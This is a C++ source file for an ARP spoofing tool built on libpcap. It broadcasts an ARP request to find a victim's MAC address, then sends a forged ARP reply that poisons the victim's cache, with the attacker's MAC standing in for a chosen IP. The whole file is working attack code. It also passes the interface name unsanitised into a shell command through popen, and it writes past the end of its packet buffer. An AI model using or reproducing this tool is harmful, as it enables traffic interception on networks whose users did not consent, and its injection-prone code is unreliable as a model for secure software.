#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>      //ether_aton_r()
//#include <stdint.h>           //uint
#include <netinet/in.h>         //struct sockaddr_in
#include <arpa/inet.h>          //inet_aton()
#include <iostream>
#include <net/ethernet.h>       //struct ether_header
#include <string.h>             //memcpy(),memcmp()
using namespace std;

struct ether_header *ethh;
struct ether_addr my_mac;
struct sockaddr_in my_ip;
struct sockaddr_in target_ip;
struct arp_header *arph;

#pragma pack(1)
struct arp_header
{
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_size;
    uint8_t protocol_size;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint32_t sender_ip;
    uint8_t target_mac[6];
    uint32_t target_ip;
};
#pragma pack(8)

void usage()
{
    printf("=========================== Usage ===========================\n");
    printf("root@ubuntu~$ ./send_arp [interface] [sender ip] [target ip]");
}

void find_me(char *dev_name);       //my mac address and my ip

int main(int argc, char *argv[])
{
    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    if(argc != 4)
    {
        usage();
        return -1;
    }

    if(handle == NULL)
    {
        fprintf(stderr, "Couldn't open device : %s : %s\n" ,dev, errbuf);
        return -1;
    }
    printf("device : %s\n",dev);

    find_me(dev);

    // make packet to sender
    unsigned char packet[42];	// my mac address is unsigned

    for(int i = 0; i < 6; i++)
        packet[i] = 0xff;

    for(int i = 6; i < 12; i++)
        packet[i] = my_mac.ether_addr_octet[i-6];

    // type : arp
    packet[12] = 0x08;
    packet[13] = 0x06;

    // Hardware type
    packet[14] = 0x00;
    packet[15] = 0x01;

    // protocol type
    packet[16] = 0x08;
    packet[17] = 0x00;

    // hardware size
    packet[18] = 0x06;

    // protocol size
    packet[19] = 0x04;

    // opcode : request
    packet[20] = 0x00;
    packet[21] = 0x01;

    // sender mac address == my mac
    for(int i = 22; i < 28; i++)
        packet[i] = packet[i - 16];

    memcpy((packet+28),&my_ip.sin_addr, sizeof(uint32_t));

    // target mac address == sender mac address (victim)
    for(int i = 32; i < 38; i++)
        packet[i] = 0x00;

    // target ip address == sender ip address argv[2]
    inet_aton(argv[2],&target_ip.sin_addr);
    memcpy((packet+38),&target_ip.sin_addr, sizeof(uint32_t));

    // arp request
    pcap_sendpacket(handle, packet, 42);

    // reset
    packet[42] ={0,};

    while (true)
    {
        struct pcap_pkthdr* header;
        const u_char* get_packet;
        int res = pcap_next_ex(handle, &header, &get_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        // arp filtering
        if(get_packet[12] == 0x08 && get_packet[13] == 0x06)
        {
            get_packet += sizeof(struct ether_header);
            arph = (struct arp_header *)get_packet;

            if(memcmp(&arph->sender_ip, &target_ip.sin_addr, sizeof(uint32_t)) == 0)
            {
                printf("Go to attack!\n");
                goto attack;
            }
        }
    }

    attack:
        printf("Make attack packet!\n");

        memcpy(packet, arph->sender_mac, 6);
        for(int i = 6; i < 12; i++)
            packet[i] = my_mac.ether_addr_octet[i-6];

        // type : arp
        packet[12] = 0x08;
        packet[13] = 0x06;

        // Hardware type
        packet[14] = 0x00;
        packet[15] = 0x01;

        // protocol type
        packet[16] = 0x08;
        packet[17] = 0x00;

        // hardware size
        packet[18] = 0x06;

        // protocol size
        packet[19] = 0x04;

        // opcode : reply
        packet[20] = 0x00;
        packet[21] = 0x02;

        // sender mac address == my mac address
        for(int i = 22; i < 28; i++)
            packet[i] = packet[i - 16];

        // sender ip == target ip (input argv[3])
        inet_aton(argv[3],&target_ip.sin_addr);
        memcpy((packet+28),&target_ip.sin_addr, sizeof(uint32_t));

        // target mac address == sender mac address
        memcpy(packet+32, arph->sender_mac, 6);

        // target ip address == sender ip address
        inet_aton(argv[2],&target_ip.sin_addr);
        memcpy((packet+38),&target_ip.sin_addr, sizeof(uint32_t));

        pcap_sendpacket(handle,packet,42);
        goto stop;

    stop:
        printf("Done\n");
        pcap_close(handle);

    return 0;
}

void find_me(char *dev_name)
{
    FILE *ptr;
    char MAC[20];
    char IP[21]={0,};
    char cmd[300]={0x0};

    //MY_MAC FIND
    sprintf(cmd,"ifconfig %s | grep HWaddr | awk '{print $5}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(MAC, sizeof(MAC), ptr);
    pclose(ptr);
    ether_aton_r(MAC, &my_mac);

    //MY_IP FIND
    sprintf(cmd,"ifconfig %s | egrep 'inet addr:' | awk '{print $2}'",dev_name);
    ptr = popen(cmd, "r");
    fgets(IP, sizeof(IP), ptr);
    pclose(ptr);
    inet_aton(IP+5,&my_ip.sin_addr);
}
